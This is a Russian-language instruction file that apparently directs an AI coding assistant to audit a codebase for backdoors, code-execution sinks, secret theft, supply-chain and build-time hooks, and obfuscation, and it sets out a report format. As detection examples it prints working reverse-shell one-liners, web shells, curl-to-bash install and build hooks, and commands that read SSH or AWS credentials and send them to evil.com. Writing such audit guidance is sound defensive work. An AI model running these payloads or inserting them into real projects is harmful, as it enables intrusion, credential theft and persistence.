---
name: "Безопасность: Проверить код на бэкдоры"
description: Аудит исходного кода на скрытое выполнение, бэкдоры, кражу секретов, атаки на цепочку поставок ПО, build-time скрипты и обфускацию (все языки; расширенные проверки для Go)
alwaysApply: false
---

# ОХОТНИК ЗА ВЫПОЛНЕНИЕМ КОДА

Ты — эксперт по информационной безопасности. Проведи тотальную проверку кодовой базы проекта. Будь параноиком.

При запросе аудита или поиска скрытых возможностей выполнения кода сканируй репозиторий по признакам ниже. Для каждой находки указывай: **файл**, **строку**, **язык**, **признак**, **уровень риска** (Критический / Высокий / Средний / Низкий) и краткое объяснение того, что может сделать злоумышленник.

---

## УНИВЕРСАЛЬНЫЕ ПРИЗНАКИ (ВСЕ ЯЗЫКИ)

- Десериализация недоверенных данных → произвольные графы объектов / gadget chains
- Шаблонизаторы с пользовательским вводом в шаблон
- Regex из пользовательского ввода (ReDoS + потенциальная инъекция)
- Динамический `require` / `import` / `load` с путями из недоверенного ввода
- Рефлексия: вызов методов по имени из внешнего ввода

---

## Python

```python
eval(...)           # прямое выполнение
exec(...)           # выполнение нескольких операторов
compile(...)        # компиляция в байткод
__import__(var)     # динамический импорт
importlib.import_module(var)
pickle.loads(...)   # произвольный RCE через объекты
yaml.load(...) без Loader=yaml.SafeLoader
marshal.loads(...)
subprocess.*, os.system(), os.popen()
ctypes.CDLL(var)    # загрузка нативной библиотеки
```

## JavaScript / TypeScript

```js
eval(...)
new Function(userInput)
setTimeout/setInterval со строковым аргументом
require(variable)
vm.runInNewContext / vm.runInThisContext
child_process.exec / execSync / spawn с shell:true
Function.prototype.constructor(code)
document.write(userInput)   // XSS → выполнение JS в браузере
```

## Java

```java
Runtime.exec(...)
ProcessBuilder(...)
ScriptEngine.eval(...)           // Nashorn/GraalJS
Class.forName(userInput)
Method.invoke(...)               // цепочка рефлексии
ObjectInputStream.readObject()   // gadget chain
Expression / Statement (EL injection)
GroovyShell.evaluate(...)
```

## C# / .NET

```csharp
Process.Start(...)
CSharpCodeProvider / Roslyn Compilation  // компиляция в рантайме
Assembly.Load(bytes)
Type.InvokeMember(...)              // рефлексия
BinaryFormatter.Deserialize(...)    // gadget chain (CVE-prone)
JsonConvert.DeserializeObject с TypeNameHandling.All
XmlSerializer / DataContractSerializer с внешними типами
PowerShell.AddScript(userInput).Invoke()
```

## PHP

```php
eval(...)
assert($userInput)                 // PHP < 8: выполняется как код
preg_replace с модификатором /e    // устарело, но встречается в legacy
create_function(...)
call_user_func($var, ...)
system() / exec() / shell_exec() / passthru() / popen()
include($var) / require($var)      // LFI → RCE
unserialize(...)                   // PHP object injection
```

## Ruby

```ruby
eval(userInput)
instance_eval / class_eval / module_eval
send(method_name)      # произвольный вызов метода
Kernel.system(...)
`backtick exec`
IO.popen(...)
Marshal.load(...)      # gadget chain
YAML.load(...)         # Psych unsafe
Binding#eval
```

## Go

### Выполнение произвольного кода

```go
os/exec.Command(var, ...)          // особенно если аргумент приходит извне
os/exec.Command("sh", "-c", userInput)  // shell-инъекция
plugin.Open(path)                  // динамическая загрузка .so
syscall.Exec
syscall.ForkExec
reflect.Value.Call(...)
text/template + html/template с пользовательской строкой шаблона
unsafe.Pointer arithmetic
```

### Сетевые бэкдоры (Go)

```go
net.Listen("tcp", ":")             // на нестандартных портах (не 80, 443, 8080)
net.Dial с хардкожеными IP или доменами
crypto/tls без валидации сертификата:
    InsecureSkipVerify: true       // риск MITM
```

### Обфускация и скрытые действия (Go)

```go
base64.StdEncoding.DecodeString(...) с последующим eval-подобным выполнением
runtime.Gosched в бесконечных циклах   // признак криптомайнинга
```

### Подозрительные импорты (проверь `go.mod`)

- `github.com/monero` и другие криптомайнеры
- `github.com/remeber/name` — редкие, непубличные репозитории
- Любой импорт, который не начинается на `github.com/ваша-компания` (для внутренних проектов)

### Дополнительные grep-проверки (Go)

Пробегись по этим паттернам и укажи, если что-то найдёшь:

1. `os.Setenv` с ключами `http_proxy`, `https_proxy` — редирект трафика
2. `time.Sleep` с большими значениями — задержка перед активацией бэкдора
3. `iota` + `<<` в константах — обфускация флагов
4. Пустые `switch` с `fallthrough` — логические бомбы

## Bash / Shell-скрипты

```bash
eval "$userInput"
source $file / . $file
$() или `` с неэкранированными переменными
exec с переменной командой
xargs без разделителя --
```

---

## Бэкдоры и reverse shell

Отдельная категория — **намеренно встроенный** вредоносный код, а не просто небезопасный вызов API.

### Сетевые индикаторы (любой язык)

Ищи сочетание: **исходящее socket/HTTP-соединение** + **выполнение shell-команды или пересылка вывода**:

```
# Классический reverse shell — socket + /bin/sh
socket.connect((ATTACKER_IP, PORT))
os.dup2(s.fileno(), 0/1/2)   # перенаправление stdin/stdout/stderr
subprocess / pty.spawn('/bin/sh')

# Замаскированные IP/домены — ищи захардкоженные строки вроде:
"192.168.", "10.", "172.16-31." в необычных местах
base64-строки рядом с вызовами socket/exec
```

### Python-бэкдоры

```python
# Reverse shell в одну строку
import socket,subprocess,os; s=socket.socket(); s.connect(("1.2.3.4",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])

# C2-beacon через HTTP
requests.get(f"http://evil.com/?cmd={cmd}&out={output}")

# Скрыто в __reduce__, __getstate__ — срабатывает при pickle.loads()
class Exploit:
    def __reduce__(self): return (os.system, ("curl http://evil.com/shell.sh | bash",))

# Отложенное выполнение через atexit или Timer
atexit.register(lambda: os.system("..."))
threading.Timer(60, backdoor).start()
```

### JavaScript / Node.js

```js
// Reverse shell через net + child_process
const net = require('net'); const sh = require('child_process').spawn('/bin/sh');
net.createConnection(4444, '1.2.3.4', () => { sh.stdout.pipe(c); })

// Персистентность через setInterval + C2 fetch
setInterval(() => fetch(`http://evil.com/?o=${require('child_process').execSync(cmd)}`), 5000)

// Вредоносные хуки package.json — выполняются при npm install/start
"scripts": { "postinstall": "curl http://evil.com/payload | sh" }
```

### PHP

```php
// Web shell — принимает команды через GET/POST
system($_GET['cmd']);
passthru($_POST['c']);
`$_REQUEST['x']`   // exec через backticks

// Обфусцированный вариант
eval(base64_decode($_POST['payload']));
$_=str_rot13('flfgrz'); $_($_GET['c']);

// Собрано через конкатенацию chr()
$f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $f($cmd);
```

### C# / .NET бэкдоры

```csharp
// Reverse shell через TcpClient
TcpClient c = new TcpClient("1.2.3.4", 4444);
Stream s = c.GetStream();
Process p = new Process(); p.StartInfo.FileName = "cmd.exe";
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardOutput = true;

// Персистентность через реестр
Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true)
        .SetValue("Updater", "C:\\payload.exe");

// WMI Event Subscription
ManagementObject filter = new ManagementClass("ROOT\\subscription:__EventFilter").CreateInstance();
```

### Bash / shell-скрипты

```bash
# Reverse shell в одну строку
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
nc -e /bin/sh 1.2.3.4 4444
python3 -c 'import socket,os,pty;...'

# Бэкдор через cron — инъекция в crontab
echo "* * * * * bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" >> /etc/crontab

# Инъекция SSH-ключа злоумышленника
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

### Бэкдоры через lifecycle-хуки (цепочка поставок ПО)

```json
// package.json — выполняется при npm install
{ "scripts": { "postinstall": "curl http://evil.com/p | sh" } }
```

```python
# setup.py — выполняется при pip install
class PostInstall(install):
    def run(self):
        os.system("curl http://evil.com/p | bash")
```

```dockerfile
# Dockerfile — вредоносная нагрузка в образе
RUN curl http://evil.com/backdoor -o /usr/bin/init && chmod +x /usr/bin/init
ENTRYPOINT ["/usr/bin/init"]
```

### Индикаторы обфускации (любой язык)

```
base64.decode / atob / b64decode рядом с exec/eval
str.split("").reverse().join("") + eval
XOR-расшифровка перед выполнением
длинные цепочки \x41\x42 или chr(65)+chr(66)
подозрительные имена переменных: _, __, _0x1a2b, l1Il, O0O
```

Создание скрытых файлов: `.` в начале имени, `os.Chmod` на 0777

### Индикаторы персистентности

```
запись в crontab / systemd unit / rc.local / .bashrc / .profile
изменение authorized_keys
создание нового пользователя (useradd, net user)
запись в реестр Windows (winreg, reg add)
автозапуск через HKCU\Software\Microsoft\Windows\CurrentVersion\Run
WMI subscription (Win32_EventFilter + Win32_EventConsumer)
```

---

## Кража секретов и эксфильтрация данных

Вредоносный код не всегда запускает shell — иногда он тихо читает и отправляет данные.

### На что обращать внимание

```python
# Чтение переменных окружения с секретами
os.environ.get("AWS_SECRET_ACCESS_KEY")
os.environ.get("DATABASE_URL")
process.env.GITHUB_TOKEN        # JS

# Чтение файлов с учётными данными
open(os.path.expanduser("~/.ssh/id_rsa")).read()
open(os.path.expanduser("~/.aws/credentials")).read()
open("/etc/passwd").read()
glob.glob("**/.env", recursive=True)

# Исходящая отправка данных
requests.post("http://evil.com", data={"k": secret})
fetch("https://evil.com", { method:"POST", body: token })

# DNS-эксфильтрация (данные в DNS-запросе)
socket.getaddrinfo(f"{b64(secret)}.evil.com", 53)
```

---

## Скрипты сборки (build-time)

Код может выполняться **до запуска приложения** — во время `make`, `cmake`, `gradle`, `cargo build` или событий сборки в IDE. Проверяй эти файлы с той же приоритетностью, что и рантайм-код.

### Файлы для сканирования в первую очередь

```
Makefile, Makefile.am, Makefile.in
CMakeLists.txt, *.cmake
build.gradle, build.gradle.kts, settings.gradle
*.csproj, Directory.Build.props, Directory.Build.targets, *.targets
build.rs (Rust)
configure.ac, configure, autogen.sh
meson.build
package.json scripts (preinstall, install, postinstall, prepare, prebuild, build)
pyproject.toml [tool.poetry.scripts], setup.py, setup.cfg
mvnw, pom.xml (exec-maven-plugin, gmavenplus)
go.mod, go.sum
```

### Makefile

```makefile
# Выполнение shell во время сборки
all:
	curl http://evil.com/payload.sh | bash

install:
	echo "* * * * * curl evil.com" >> /etc/crontab

# Подстановка переменных в shell
$(shell curl evil.com/collect?host=$(HOSTNAME))

# Рекурсивный make с недоверенными скриптами
include $(curl -s http://evil.com/Makefile.fragment)
```

### CMake

```cmake
# execute_process выполняется при configure или build
execute_process(COMMAND curl http://evil.com/p | bash)

# Пользовательская команда при каждой сборке
add_custom_command(TARGET app POST_BUILD
  COMMAND powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p')")

# Скачивание и выполнение без проверки целостности
file(DOWNLOAD "http://evil.com/tool.exe" "${CMAKE_BINARY_DIR}/tool.exe")
execute_process(COMMAND "${CMAKE_BINARY_DIR}/tool.exe")

# include() удалённого или сгенерированного скрипта
include(http://evil.com/malicious.cmake)   # если поддерживается / предварительно скачан
```

### Gradle (Java/Kotlin/Android)

```kotlin
// build.gradle.kts
tasks.register("preBuild") {
    exec { commandLine("bash", "-c", "curl http://evil.com/p | sh") }
}

// Задача скачивания без проверки контрольной суммы
tasks.register("fetchDeps") {
    val url = "http://evil.com/malware.jar"
    // копирование в classpath
}
```

```groovy
// build.gradle
task postBuild(type: Exec) {
    commandLine 'curl', 'http://evil.com/exfil', '-d', System.getenv('HOME')
}
```

### MSBuild / .NET (.csproj, .targets)

```xml
<!-- Pre/Post build events выполняются при каждой компиляции -->
<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
  <Exec Command="powershell -enc BASE64..." />
</Target>

<PropertyGroup>
  <PostBuildEvent>curl http://evil.com/?out=%USERNAME%</PostBuildEvent>
  <PreBuildEvent>certutil -urlcache -f http://evil.com/p.exe %TEMP%\p.exe &amp; %TEMP%\p.exe</PreBuildEvent>
</PropertyGroup>

<!-- Вредоносный import в Directory.Build.targets -->
<Import Project="$(MSBuildThisFileDirectory)hidden\payload.targets" />
```

### Rust build.rs

```rust
// build.rs выполняется при каждом cargo build
fn main() {
    std::process::Command::new("sh")
        .arg("-c")
        .arg("curl http://evil.com/p | bash")
        .status()
        .unwrap();

    // Исходящий beacon во время сборки
    println!("cargo:rustc-env=BEACON={}", std::env::var("USER").unwrap_or_default());
}
```

### Autotools / Meson

```bash
# configure.ac — выполняется при ./configure
AC_CONFIG_COMMANDS([backdoor], [curl http://evil.com/p | bash])
```

```meson
# meson.build
run_command('bash', '-c', 'curl http://evil.com/p | sh', check: false)
```

### Maven / Ant

```xml
<!-- pom.xml — exec-maven-plugin -->
<plugin>
  <artifactId>exec-maven-plugin</artifactId>
  <executions>
    <execution>
      <phase>initialize</phase>
      <goals><goal>exec</goal></goals>
      <configuration>
        <executable>bash</executable>
        <arguments><argument>-c</argument><argument>curl evil.com | sh</argument></arguments>
      </configuration>
    </execution>
  </executions>
</plugin>
```

### Подозрительные признаки при сборке (любая система сборки)

```
curl | bash / wget | sh / Invoke-WebRequest | iex
Скачивание с неофициальных URL без проверки контрольной суммы/подписи
Pre/Post build events, затрагивающие ~/.ssh, реестр, crontab или отправляющие переменные окружения наружу
Сгенерированные скрипты в репозитории без читаемого исходника (.sh из неизвестного ввода)
Скрипты сборки, которые выполняются только в CI, но не локально (if: env.CI)
include()/import файлов вне репозитория или с сетевых путей
```

---

## CI/CD и Git-хуки

Код выполняется не всегда напрямую — иногда через инфраструктуру.

```yaml
# .github/workflows/*.yml — GitHub Actions
- run: curl http://evil.com/p | bash
- uses: malicious-action@v1   # сторонний action без pin по hash

# .gitlab-ci.yml
script:
  - eval $EVIL_VAR

# Jenkinsfile
sh "curl http://evil.com | bash"
```

```bash
# .git/hooks/pre-commit, pre-push, post-merge
# Выполняются автоматически при git-операциях
curl http://evil.com/collect -d "$(git log --all)" &
```

```json
// .vscode/settings.json — выполняется при открытии проекта
{
  "terminal.integrated.env.linux": { "PROMPT_COMMAND": "curl evil.com" }
}
```

---

## Trojan Source и Unicode-атаки

Код выглядит безопасным для ревьюеров, но компилятор/интерпретатор ведёт себя иначе (CVE-2021-42574).

```
Двунаправленные управляющие символы в строках и комментариях:
  U+202A (встраивание слева направо)
  U+202B (встраивание справа налево)
  U+202C (снятие направленного форматирования)
  U+2066 / U+2067 / U+2069

Пример — комментарий скрывает код:
  /* Check if admin ‮ } if (isAdmin) { */ doSomethingDangerous();

Омоглифы в идентификаторах (выглядят как латиница, другой Unicode):
  pаyment и payment (а — кириллица)
  lоgin и login (о — кириллица)
```

**Проверка**: ищи не-ASCII в именах переменных, функций и строковых литералах через `rg '[^\x00-\x7F]' --type py` (и аналоги для других языков).

---

## Криптомайнинг

```python
# Явные индикаторы
import hashlib; while True: hashlib.sha256(nonce).hexdigest()  # PoW-цикл
stratum+tcp://pool.minexmr.com:4444   # адрес пула в строках
xmrig / cpuminer / minerd             # имена бинарников майнеров

# Скрыто через WebAssembly (в браузере)
WebAssembly.instantiate(wasmMinerBytes)
```

Для Go: `runtime.Gosched` в бесконечных циклах, импорты `github.com/monero` и подобные в `go.mod`.

---

## Зависимости и цепочка поставок ПО

```
Проверь package.json / requirements.txt / pom.xml / go.mod:
- Подмена имён пакетов (typosquatting): requesets, djano, lodahs
- Имена пакетов, похожие на внутренние (dependency confusion)
- Незакреплённые версии (= всегда тянет последнюю, включая вредоносные обновления)
- Пакеты с очень малым числом загрузок, но широкими правами
- Редкие, непубличные репозитории (например github.com/remeber/name)
- Импорты вне корпоративного префикса (github.com/ваша-компания) во внутренних проектах

Проверь lock-файлы:
- package-lock.json / yarn.lock / go.sum: resolved URL должен указывать на официальный реестр
- Перехваченный реестр: "resolved": "http://evil.com/lodash.tgz"
```

### Проверка уязвимостей Go (govulncheck)

Для Go-проектов запусти `govulncheck ./...` (если установлен) и приложи вывод к отчёту.

Если не установлен — предложи установить:

```bash
go install golang.org/x/vuln/cmd/govulncheck@latest
```

---

## Полиглот-файлы и steganography

```
Файл валиден сразу в двух форматах:
  image.jpg — открывается как изображение, но содержит zip с полезной нагрузкой
  script.py — одновременно валидный Python И валидный zip

Скрытый код в бинарных ресурсах:
  base64-блоки внутри PNG/JPEG (EXIF, комментарии)
  .pyc / .class в репозитории без исходника
  минифицированный JS с eval(atob("...")) в конце файла
```

---

## Вредоносные тесты

```python
# Тесты тоже выполняются в CI — частое место для бэкдоров
def test_connection():
    import os; os.system("curl evil.com/collect -d $(cat ~/.ssh/id_rsa)")
    assert True  # тест «проходит»
```

---

## Формат отчёта

### Уровни риска

| Уровень | Критерии |
|---------|----------|
| **Критический** | Прямой RCE без аутентификации, активный бэкдор, reverse shell |
| **Высокий** | RCE за аутентификацией, десериализация, кража секретов, build-time выполнение кода |
| **Средний** | Потенциально опасный API при определённых условиях |
| **Низкий** | Небезопасная практика, риск зависит от контекста |

### Категории находок

| Тип | Когда использовать |
|-----|-------------------|
| `[BACKDOOR]` | Намеренно встроенный вредоносный код |
| `[RCE]` | Возможность произвольного выполнения кода |
| `[EXFIL]` | Кража данных / исходящая передача секретов |
| `[PERSIST]` | Персистентность / закрепление в системе |
| `[SUPPLY]` | Атака через зависимости / lifecycle-хуки |
| `[BUILD]` | Вредоносное или подозрительное build-time выполнение |
| `[OBFUSC]` | Подозрительная обфускация |
| `[VULN]` | Небезопасный API без явного вредоносного намерения |

### Формат одной находки (детальный)

```
[ТИП][РИСК] path/to/file.ext (строка N)
Признак     : eval(userInput)
Язык        : Python
Доступность : публично без аутентификации / за аутентификацией / только локально / при сборке
Суть        : Прямое выполнение строки из HTTP-запроса → полный RCE
Эксплуатация: POST /api/run с телом {"code": "__import__('os').system('id')"}
Рекомендация: Whitelist допустимых операций или AST-парсинг
```

### Пример заполненной находки

```
[BACKDOOR][Критический] src/utils/helpers.py (строка 247)
Признак     : socket.connect + os.dup2 + subprocess.call(["/bin/sh"])
Язык        : Python
Доступность : срабатывает при импорте модуля (без условий)
Суть        : Классический reverse shell — при импорте подключается к 185.220.101.45:4444
              и передаёт управление shell
Эксплуатация: автоматически — достаточно запустить приложение
Рекомендация: НЕМЕДЛЕННО удалить файл, проверить git log на автора
```

### Итоговая сводка (в конце отчёта)

```
## Сводка аудита

Просканировано файлов : 142
Находок               : 7 (Критический: 1 | Высокий: 2 | Средний: 3 | Низкий: 1)

КРИТИЧЕСКИЕ (требуют немедленных действий):
  - [BACKDOOR] src/utils/helpers.py:247 — активный reverse shell

ВЫСОКИЕ:
  - [EXFIL]   config/loader.py:89 — читает ~/.aws/credentials + POST наружу
  - [RCE]     api/exec.php:34 — eval(base64_decode($_POST[...]))

СРЕДНИЕ:
  - [VULN]    lib/serial.py:12 — pickle.loads без проверки источника
  - [SUPPLY]  package.json — postinstall hook запускает внешний скрипт
  - [BUILD]   CMakeLists.txt:34 — execute_process скачивает и запускает удалённый скрипт
  - [OBFUSC]  dist/bundle.min.js:1 — eval(atob("...")) в конце файла

НИЗКИЕ:
  - [VULN]    tests/test_db.py:5 — subprocess.run с shell=True (в тестах)

Вердикт: КОД НЕБЕЗОПАСЕН ДЛЯ ЗАПУСКА. Исправьте критические и высокие находки до деплоя или сборки.
```

Если находок нет:

```
## Сводка аудита

Просканировано файлов: 87
Находок: 0

Очевидных признаков вредоносного кода или критических уязвимостей выполнения не обнаружено.
Дополнительно рекомендуется проверить зависимости через `npm audit` / `pip-audit` / `trivy` / `govulncheck`.
```

### Итоговый вердикт (одна фраза)

После проверки напиши **одну** из фраз:

- `🚨 ПРОЕКТ СКОМПРОМЕТИРОВАН — обнаружен активный бэкдор`
- `⚠️ Есть уязвимости, но бэкдоров нет`
- `🟢 БЕЗОПАСНО — бэкдоры не найдены`

---

## Сохранение результата

Сохрани полный отчёт в файл:

```
reports/security-audit-$(date +%Y%m%d-%H%M%S).txt
```

Для Go-проектов допустимо также:

```
reports/security-go-$(date +%Y%m%d-%H%M%S).txt
```

Папку `reports/` создай, если её нет.

---

## Подсказки по области сканирования

- Приоритет файлам, обрабатывающим **данные HTTP-запросов**, **аргументы CLI**, **конфиги**, **десериализованные объекты** или **IPC/socket-сообщения**.
- Приоритет **build-файлам** (`Makefile`, `CMakeLists.txt`, `build.gradle`, `*.csproj`, `build.rs`, `go.mod`) — они выполняются до запуска приложения.
- Ищи **стоки** (sinks — опасные вызовы), достижимые от **источников** (sources — пользовательский ввод).
- Отмечай, когда опасный вызов **за аутентификацией** или **публично доступен** — это меняет эксплуатируемость.
- При поиске бэкдоров: помечай любой **исходящий сетевой вызов** в несетевом коде, особенно в паре с shell-выполнением.
- Проверяй `package.json`, `setup.py`, `Makefile`, `Dockerfile`, `CMakeLists.txt`, `build.gradle`, `go.mod` на вредоносные lifecycle- или build-хуки.
- Помечай **захардкоженные IP/домены** вне config/test-файлов.
- Ищи **закодированные полезные нагрузки**: base64-блоки, XOR-циклы, chr()-цепочки в файлах, не являющихся данными.
- Помечай шаги сборки, которые **скачивают и выполняют** без проверки контрольной суммы или подписи.
- Для Go: проверяй `.go` файлы на паттерны из раздела «Go», дополнительные grep-проверки и `govulncheck`.
